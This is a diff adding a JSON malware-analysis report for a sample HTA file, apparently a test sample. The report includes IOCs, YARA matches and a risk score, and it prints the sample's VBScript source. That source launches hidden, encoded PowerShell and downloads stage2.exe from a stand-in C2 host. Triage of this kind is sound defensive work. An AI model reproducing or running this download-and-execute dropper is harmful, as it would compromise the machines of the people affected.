@@ -1,0 +1,535 @@
+{
+  "tool": "vbascope",
+  "version": "1.0.0",
+  "analyzed_at": "2026-11-10T23:35:30.286122+00:00",
+  "errors": [],
+  "file": {
+    "path": "/tmp/claude-1000/-home-byteoverride-Documents-Tools-vbascope/65eb8bd4-501d-4997-a2d6-b5f7496b734e/scratchpad/samples/dropper.hta",
+    "name": "dropper.hta",
+    "extension": ".hta",
+    "file_type": "HTML Application",
+    "ooxml_subtype": null,
+    "libmagic_mime": "text/html",
+    "libmagic_desc": "HTML document, ASCII text",
+    "hashes": {
+      "md5": "9ddf8eb39e88ed54f1957b79b9f7a5dc",
+      "sha1": "94137840dc8e6265ab9ef19fb129bdf2cbc027ca",
+      "sha256": "a6b23d1ac0483f8f186d49e2767f8ae127b3374309f82a33032ccb51f291cb09",
+      "size": 494,
+      "magic_bytes": "3c68746d6c3e3c68"
+    },
+    "identification_notes": []
+  },
+  "vba": {
+    "has_vba": true,
+    "module_count": 1,
+    "vba_stomping_detected": false,
+    "extraction_method": "content-passthrough",
+    "modules": [
+      {
+        "module_name": "dropper.hta",
+        "module_type": "HTA",
+        "stream_path": "dropper.hta",
+        "code_len": 494,
+        "is_stomped": false,
+        "notes": [],
+        "source_code": "<html><head><script language=\"VBScript\">\nSub Window_OnLoad\n  Set sh = CreateObject(\"WScript.Shell\")\n  cmd = \"powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\"\n  sh.Run cmd, 0, False\n  ' download cradle\n  Set x = CreateObject(\"MSXML2.ServerXMLHTTP\")\n  x.Open \"GET\", \"http://evil-c2.example.com/stage2.exe\", False\n  x.Send\n  Set stream = CreateObject(\"ADODB.Stream\")\n  stream.SaveToFile Environ(\"TEMP\") & \"\\a.exe\"\nEnd Sub\n</script></head><body></body></html>"
+      }
+    ],
+    "errors": []
+  },
+  "xlm": {
+    "has_xlm": false,
+    "formulas": [],
+    "dangerous_calls": [],
+    "timed_out": false,
+    "errors": []
+  },
+  "rtf": {
+    "object_count": 0,
+    "objects": [],
+    "errors": []
+  },
+  "metadata": {
+    "fields": {},
+    "template": null,
+    "flags": [],
+    "errors": []
+  },
+  "onenote": {
+    "applicable": false
+  },
+  "pdf": {
+    "applicable": false
+  },
+  "lnk": {
+    "applicable": false
+  },
+  "xll": {
+    "applicable": false
+  },
+  "static": {
+    "findings": [
+      {
+        "category": "execution",
+        "name": "WScript.Shell",
+        "severity": "high",
+        "mitre": "T1059.001/T1059.005",
+        "description": "Instantiates the Windows Script Host shell to run commands.",
+        "count": 6,
+        "examples": [
+          "sh = CreateObject(\"WScript.Shell\")   cmd = \"powershe",
+          "w_OnLoad   Set sh = CreateObject(\"WScript.Shell\")   cmd = \"powershe"
+        ]
+      },
+      {
+        "category": "execution",
+        "name": "PowerShell invocation",
+        "severity": "critical",
+        "mitre": "T1059.001",
+        "description": "Spawns PowerShell - the dominant fileless execution vector.",
+        "count": 2,
+        "examples": [
+          "pt.Shell\")   cmd = \"powershell.exe -nop -w hidden -ep"
+        ]
+      },
+      {
+        "category": "execution",
+        "name": "PowerShell stealth flags",
+        "severity": "critical",
+        "mitre": "T1059.001/T1564",
+        "description": "Encoded/hidden PowerShell: -enc, -nop, -w hidden, -ep bypass.",
+        "count": 8,
+        "examples": [
+          "w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB",
+          "d = \"powershell.exe -nop -w hidden -ep bypas",
+          "powershell.exe -nop -w hidden -ep bypass -enc SQB"
+        ]
+      },
+      {
+        "category": "execution",
+        "name": "IEX / Invoke-Expression",
+        "severity": "critical",
+        "mitre": "T1059.001",
+        "description": "Dynamic PowerShell execution of a downloaded/decoded string.",
+        "count": 2,
+        "examples": [
+          "decoded layer ===== IEX (New-Object IEX (Ne",
+          "=== IEX (New-Object IEX (New-Object"
+        ]
+      },
+      {
+        "category": "download",
+        "name": "XMLHTTP / ServerXMLHTTP",
+        "severity": "high",
+        "mitre": "T1105",
+        "description": "MSXML HTTP objects fetch remote content (payload or C2).",
+        "count": 4,
+        "examples": [
+          "t x = CreateObject(\"MSXML2.ServerXMLHTTP\")   x.Open \"GET\", \"",
+          "reateObject(\"MSXML2.ServerXMLHTTP\")   x.Open \"GET\", \""
+        ]
+      },
+      {
+        "category": "download",
+        "name": "ADODB.Stream write",
+        "severity": "high",
+        "mitre": "T1105",
+        "description": "ADODB.Stream commonly pairs with a download to write bytes to disk.",
+        "count": 2,
+        "examples": [
+          "eam = CreateObject(\"ADODB.Stream\")   stream.SaveToFi"
+        ]
+      },
+      {
+        "category": "obfuscation",
+        "name": "Environ()",
+        "severity": "low",
+        "mitre": "T1027",
+        "description": "Environ() resolves %TEMP%/%APPDATA% drop paths at runtime.",
+        "count": 2,
+        "examples": [
+          "stream.SaveToFile Environ(\"TEMP\") & \"\\a.exe\" E"
+        ]
+      },
+      {
+        "category": "client",
+        "name": "Embedded <script> / DOM inject",
+        "severity": "high",
+        "mitre": "T1027.006/T1204.001",
+        "description": "Inline <script>, runtime script injection (createElementNS) or SVG <foreignObject> - markup-based code (SVG smuggling, HTA, HTML).",
+        "count": 2,
+        "examples": [
+          "<html><head><script language=\"VBScript\"",
+          "</html> <html><head><script language=\"VBScript\""
+        ]
+      },
+      {
+        "category": "filesystem",
+        "name": "FileSystemObject write",
+        "severity": "medium",
+        "mitre": "T1105",
+        "description": "Scripting.FileSystemObject CreateTextFile/Write drops a file.",
+        "count": 2,
+        "examples": [
+          "B.Stream\")   stream.SaveToFile Environ(\"TEMP\") & \""
+        ]
+      }
+    ],
+    "autoexec_triggers": [],
+    "has_mz_embedded": false,
+    "has_dde": false,
+    "categories_hit": [
+      "client",
+      "download",
+      "execution",
+      "filesystem",
+      "obfuscation"
+    ]
+  },
+  "obfuscation": {
+    "chr_count": 0,
+    "chr_heavy_modules": [],
+    "max_concat_chain": 0,
+    "concat_chain_count": 0,
+    "base64_blobs": 2,
+    "base64_decoded_pe": false,
+    "high_entropy_identifiers": 0,
+    "sample_gibberish": [],
+    "score": 10,
+    "indicators": [
+      "2 base64-like blob(s)."
+    ]
+  },
+  "iocs": {
+    "urls": [
+      "http://evil-c2.example.com/stage2.exe"
+    ],
+    "domains": [
+      "evil-c2.example.com"
+    ],
+    "ips": [],
+    "emails": [],
+    "win_paths": [],
+    "unc_paths": [],
+    "registry_keys": [],
+    "defanged": {
+      "urls": [
+        "hxxp://evil-c2[.]example[.]com/stage2[.]exe"
+      ],
+      "domains": [
+        "evil-c2[.]example[.]com"
+      ],
+      "ips": [],
+      "emails": []
+    },
+    "total": 2
+  },
+  "yara": {
+    "available": true,
+    "match_count": 8,
+    "rules_loaded": 31,
+    "matches": [
+      {
+        "rule": "Maldoc_PowerShell_DownloadCradle",
+        "namespace": "builtin:default",
+        "tags": [],
+        "meta": {
+          "author": "vbascope",
+          "description": "PowerShell download cradle (fileless payload fetch + run)",
+          "mitre": "T1059.001, T1105",
+          "severity": "critical"
+        },
+        "description": "PowerShell download cradle (fileless payload fetch + run)",
+        "source": "file",
+        "strings": [
+          {
+            "identifier": "$ps",
+            "offset": 109,
+            "data": "powershell"
+          },
+          {
+            "identifier": "$enc",
+            "offset": 150,
+            "data": "-enc"
+          },
+          {
+            "identifier": "$hidden",
+            "offset": 132,
+            "data": "hidden"
+          }
+        ]
+      },
+      {
+        "rule": "Maldoc_PowerShell_StealthFlags",
+        "namespace": "builtin:default",
+        "tags": [],
+        "meta": {
+          "author": "vbascope",
+          "description": "PowerShell launched with stealth/evasion flags",
+          "mitre": "T1059.001, T1564",
+          "severity": "high"
+        },
+        "description": "PowerShell launched with stealth/evasion flags",
+        "source": "file",
+        "strings": [
+          {
+            "identifier": "$f1",
+            "offset": 124,
+            "data": "-nop"
+          },
+          {
+            "identifier": "$f3",
+            "offset": 129,
+            "data": "-w hidden"
+          },
+          {
+            "identifier": "$f5",
+            "offset": 139,
+            "data": "-ep bypass"
+          }
+        ]
+      },
+      {
+        "rule": "Maldoc_VBA_Shell_Execution",
+        "namespace": "builtin:default",
+        "tags": [],
+        "meta": {
+          "author": "vbascope",
+          "description": "VBA process execution primitives",
+          "mitre": "T1059",
+          "severity": "high"
+        },
+        "description": "VBA process execution primitives",
+        "source": "file",
+        "strings": [
+          {
+            "identifier": "$s1",
+            "offset": 84,
+            "data": "WScript.Shell"
+          }
+        ]
+      },
+      {
+        "rule": "Maldoc_Download_To_Disk",
+        "namespace": "builtin:default",
+        "tags": [],
+        "meta": {
+          "author": "vbascope",
+          "description": "Download-to-disk dropper (URLDownloadToFile / XMLHTTP + ADODB.Stream)",
+          "mitre": "T1105",
+          "severity": "critical"
+        },
+        "description": "Download-to-disk dropper (URLDownloadToFile / XMLHTTP + ADODB.Stream)",
+        "source": "file",
+        "strings": [
+          {
+            "identifier": "$d3",
+            "offset": 264,
+            "data": "MSXML2.ServerXMLHTTP"
+          },
+          {
+            "identifier": "$stream",
+            "offset": 388,
+            "data": "ADODB.Stream"
+          },
+          {
+            "identifier": "$save",
+            "offset": 412,
+            "data": "SaveToFile"
+          }
+        ]
+      },
+      {
+        "rule": "Maldoc_PowerShell_DownloadCradle",
+        "namespace": "builtin:default",
+        "tags": [],
+        "meta": {
+          "author": "vbascope",
+          "description": "PowerShell download cradle (fileless payload fetch + run)",
+          "mitre": "T1059.001, T1105",
+          "severity": "critical"
+        },
+        "description": "PowerShell download cradle (fileless payload fetch + run)",
+        "source": "vba",
+        "strings": [
+          {
+            "identifier": "$ps",
+            "offset": 109,
+            "data": "powershell"
+          },
+          {
+            "identifier": "$enc",
+            "offset": 150,
+            "data": "-enc"
+          },
+          {
+            "identifier": "$hidden",
+            "offset": 132,
+            "data": "hidden"
+          }
+        ]
+      },
+      {
+        "rule": "Maldoc_PowerShell_StealthFlags",
+        "namespace": "builtin:default",
+        "tags": [],
+        "meta": {
+          "author": "vbascope",
+          "description": "PowerShell launched with stealth/evasion flags",
+          "mitre": "T1059.001, T1564",
+          "severity": "high"
+        },
+        "description": "PowerShell launched with stealth/evasion flags",
+        "source": "vba",
+        "strings": [
+          {
+            "identifier": "$f1",
+            "offset": 124,
+            "data": "-nop"
+          },
+          {
+            "identifier": "$f3",
+            "offset": 129,
+            "data": "-w hidden"
+          },
+          {
+            "identifier": "$f5",
+            "offset": 139,
+            "data": "-ep bypass"
+          }
+        ]
+      },
+      {
+        "rule": "Maldoc_VBA_Shell_Execution",
+        "namespace": "builtin:default",
+        "tags": [],
+        "meta": {
+          "author": "vbascope",
+          "description": "VBA process execution primitives",
+          "mitre": "T1059",
+          "severity": "high"
+        },
+        "description": "VBA process execution primitives",
+        "source": "vba",
+        "strings": [
+          {
+            "identifier": "$s1",
+            "offset": 84,
+            "data": "WScript.Shell"
+          }
+        ]
+      },
+      {
+        "rule": "Maldoc_Download_To_Disk",
+        "namespace": "builtin:default",
+        "tags": [],
+        "meta": {
+          "author": "vbascope",
+          "description": "Download-to-disk dropper (URLDownloadToFile / XMLHTTP + ADODB.Stream)",
+          "mitre": "T1105",
+          "severity": "critical"
+        },
+        "description": "Download-to-disk dropper (URLDownloadToFile / XMLHTTP + ADODB.Stream)",
+        "source": "vba",
+        "strings": [
+          {
+            "identifier": "$d3",
+            "offset": 264,
+            "data": "MSXML2.ServerXMLHTTP"
+          },
+          {
+            "identifier": "$stream",
+            "offset": 388,
+            "data": "ADODB.Stream"
+          },
+          {
+            "identifier": "$save",
+            "offset": 412,
+            "data": "SaveToFile"
+          }
+        ]
+      }
+    ],
+    "errors": []
+  },
+  "risk": {
+    "score": 100,
+    "classification": "Critical",
+    "breakdown": [
+      {
+        "points": 15,
+        "reason": "Execution capability: WScript.Shell"
+      },
+      {
+        "points": 15,
+        "reason": "Execution capability: PowerShell invocation"
+      },
+      {
+        "points": 15,
+        "reason": "Execution capability: PowerShell stealth flags"
+      },
+      {
+        "points": 15,
+        "reason": "Execution capability: IEX / Invoke-Expression"
+      },
+      {
+        "points": 15,
+        "reason": "Download capability: XMLHTTP / ServerXMLHTTP"
+      },
+      {
+        "points": 15,
+        "reason": "Download capability: ADODB.Stream write"
+      },
+      {
+        "points": 10,
+        "reason": "Client capability: Embedded <script> / DOM inject"
+      },
+      {
+        "points": 5,
+        "reason": "Filesystem capability: FileSystemObject write"
+      },
+      {
+        "points": 10,
+        "reason": "Obfuscation indicators (sub-score 10)"
+      },
+      {
+        "points": 10,
+        "reason": "YARA: Maldoc_PowerShell_DownloadCradle"
+      },
+      {
+        "points": 10,
+        "reason": "YARA: Maldoc_PowerShell_StealthFlags"
+      },
+      {
+        "points": 10,
+        "reason": "YARA: Maldoc_VBA_Shell_Execution"
+      },
+      {
+        "points": 10,
+        "reason": "YARA: Maldoc_Download_To_Disk"
+      },
+      {
+        "points": 10,
+        "reason": "YARA: Maldoc_PowerShell_DownloadCradle"
+      },
+      {
+        "points": 10,
+        "reason": "YARA: Maldoc_PowerShell_StealthFlags"
+      },
+      {
+        "points": 10,
+        "reason": "YARA: Maldoc_VBA_Shell_Execution"
+      },
+      {
+        "points": 10,
+        "reason": "YARA: Maldoc_Download_To_Disk"
+      }
+    ]
+  },
+  "next_steps": [
+    "Pivot the extracted URLs/domains in VirusTotal, URLhaus and your passive DNS. Pull the staged payload in an isolated VM, not on a host.",
+    "Decode the PowerShell: base64 -d the -enc blob, then deobfuscate the download cradle to recover the second-stage URL.",
+    "Cross-reference the SHA256 against MalwareBazaar / your internal corpus before writing it up - you may already have the family and C2."
+  ]
+}
